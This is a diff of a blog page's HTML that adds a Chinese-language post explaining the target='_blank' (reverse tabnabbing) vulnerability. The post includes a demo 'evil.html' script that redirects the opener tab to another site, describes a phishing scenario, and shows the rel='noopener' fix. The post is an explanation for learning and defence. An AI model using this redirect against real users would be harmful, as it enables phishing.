@@ -4,17 +4,28 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>Tag: 乌云爬虫 | Anka9080&#39;s Notes</title>
+  <title>Target_Blank 漏洞分析 | Anka9080&#39;s Notes</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Python,渗透测试,安全研发">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Anka9080's Notes">
-<meta property="og:url" content="http://www.evilclay.com/tags/乌云爬虫/index.html">
+  <meta name="description" content="概述在浏览器中点击 target=&amp;#39;_blank&amp;#39; 的标签后，新标签的站点可以通过 windows.opener 对原标签的进行访问，进而可能会导致钓鱼事件或拿到用户的浏览历史。
+Demo在这个 Demo 中，打开原网站( index.html )中的 一个链接( evil.html )，会在新Tab打开新的页面，同时原 Tab 中的网站会被替换成另一个网站。
+原网站代码( ind">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Target_Blank 漏洞分析">
+<meta property="og:url" content="http://www.evilclay.com/2016/09/11/Target-Blank漏洞分析/index.html">
 <meta property="og:site_name" content="Anka9080's Notes">
-<meta property="og:description" content="Python,渗透测试,安全研发">
+<meta property="og:description" content="概述在浏览器中点击 target=&amp;#39;_blank&amp;#39; 的标签后，新标签的站点可以通过 windows.opener 对原标签的进行访问，进而可能会导致钓鱼事件或拿到用户的浏览历史。
+Demo在这个 Demo 中，打开原网站( index.html )中的 一个链接( evil.html )，会在新Tab打开新的页面，同时原 Tab 中的网站会被替换成另一个网站。
+原网站代码( ind">
+<meta property="og:image" content="http://www.evilclay.com/img/tb_1.png">
+<meta property="og:image" content="http://www.evilclay.com/img/tb_2.png">
+<meta property="og:image" content="http://www.evilclay.com/img/tb_3.png">
+<meta property="og:updated_time" content="2016-09-11T08:32:06.306Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Anka9080's Notes">
-<meta name="twitter:description" content="Python,渗透测试,安全研发">
+<meta name="twitter:title" content="Target_Blank 漏洞分析">
+<meta name="twitter:description" content="概述在浏览器中点击 target=&amp;#39;_blank&amp;#39; 的标签后，新标签的站点可以通过 windows.opener 对原标签的进行访问，进而可能会导致钓鱼事件或拿到用户的浏览历史。
+Demo在这个 Demo 中，打开原网站( index.html )中的 一个链接( evil.html )，会在新Tab打开新的页面，同时原 Tab 中的网站会被替换成另一个网站。
+原网站代码( ind">
+<meta name="twitter:image" content="http://www.evilclay.com/img/tb_1.png">
   
     <link rel="alternative" href="/atom.xml" title="Anka9080&#39;s Notes" type="application/atom+xml">
   
@@ -200,53 +211,166 @@
 	</div>
 </nav>
 
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-Target-Blank漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/05/27/wooyun-spider/" class="archive-article-date">
-  	<time datetime="2016-05-27T10:24:16.000Z" itemprop="datePublished">May 27</time>
+    <div class="article-meta">
+      <a href="/2016/09/11/Target-Blank漏洞分析/" class="article-date">
+  	<time datetime="2016-09-11T07:58:16.000Z" itemprop="datePublished">2016-09-11</time>
 </a>
-        </div>
-    	 
+    </div>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/05/27/wooyun-spider/">爬取 WooYun 论坛所有漏洞条目的相关信息</a>
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Target_Blank 漏洞分析
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/乌云爬虫/">乌云爬虫</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/多线程/">多线程</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/正则表达式/">正则表达式</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
 	</div>
 
-          
+        
 
-        </div>
         <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
+      </div>
+      
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在浏览器中点击 <code>target=&#39;_blank&#39;</code> 的标签后，新标签的站点可以通过 <code>windows.opener</code> 对原标签的进行访问，进而可能会导致钓鱼事件或拿到用户的浏览历史。</p>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>在这个 Demo 中，打开原网站( index.html )中的 一个链接( evil.html )，会在新Tab打开新的页面，同时原 Tab 中的网站会被替换成另一个网站。</p>
+<p>原网站代码( index.html ):</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Index Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    Target_Blank_Vuln Demo:
+    &lt;br&gt;
+
+    &lt;br&gt;
+    After u click the evil site , this page will be replaced to another site silently!
+    &lt;br&gt;&lt;br&gt;
+    &lt;!-- Fixed --&gt;
+    &lt;!-- &lt;a href=&quot;evil.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Evil Site&lt;/a&gt; --&gt;
+    &lt;!-- Vuln --&gt;
+    &lt;a href=&quot;evil.html&quot; target=&quot;_blank&quot;&gt;Evil Site&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>恶意链接的HTML源码( evil.html ):</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Evil Site&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        if (window.opener) {
+            window.opener.location = &quot;http://www.evilclay.com&quot;;
+        }
+    &lt;/script&gt;
+    &lt;h2&gt;hey, I have Got U.&lt;/h2&gt;
+    &lt;br&gt;
+    &lt;h2&gt;Look Back :P&lt;/h2&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>分析： 通过 <code>target=&quot;_blank&quot;</code> 打开的新的标签页中的网站 evil.html 会控制原标签页的内容，在这里会把原标签重定向到 www.evilclay.com .</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol>
+<li>浏览器访问 <code>index.html</code> ， 页面如下：</li>
+</ol>
+<p><img src="/img/tb_1.png" alt=""></p>
+<ol>
+<li>点击 <code>index.html</code> 中的 链接，发现在新的Tab打开链接，同时原Tab正在跳转至另外一个网站(在 <code>Javascript</code> 中自定义的链接)。</li>
+</ol>
+<p><img src="/img/tb_2.png" alt=""></p>
+<ol>
+<li>返回原 Tab 页面，确实已经不是之前的页面了。</li>
+</ol>
+<p><img src="/img/tb_3.png" alt=""></p>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>这个漏洞的利用条件是攻击者可以在正常页面中加入自己网站的一个链接，从而可以拿来对其他用户进行钓鱼攻击。先伪造好一个与原网站一样的页面，其他用户点击这个连接时，替换原网页的内容，将用户导向到钓鱼网站上，在移动端的利用应该会更隐蔽</p>
+<p>目前，Twitter 依然没有 fix 这个漏洞，自己可以在 Twitter 的个人简介中添加链接进行测试  xD</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://dev.to/ben/the-targetblank-vulnerability-by-example" target="_blank" rel="external">https://dev.to/ben/the-targetblank-vulnerability-by-example</a></li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/09/11/Ubuntu16.04-编译安装最新版Hydra/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Ubuntu16.04 编译安装最新版Hydra</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="Target-Blank漏洞分析" data-title="Target_Blank 漏洞分析" data-url="http://www.evilclay.com/2016/09/11/Target-Blank漏洞分析/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
 
 </div>
       <footer id="footer">
@@ -272,9 +396,9 @@
 		mathjax: true,
 		animate: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false
 	}
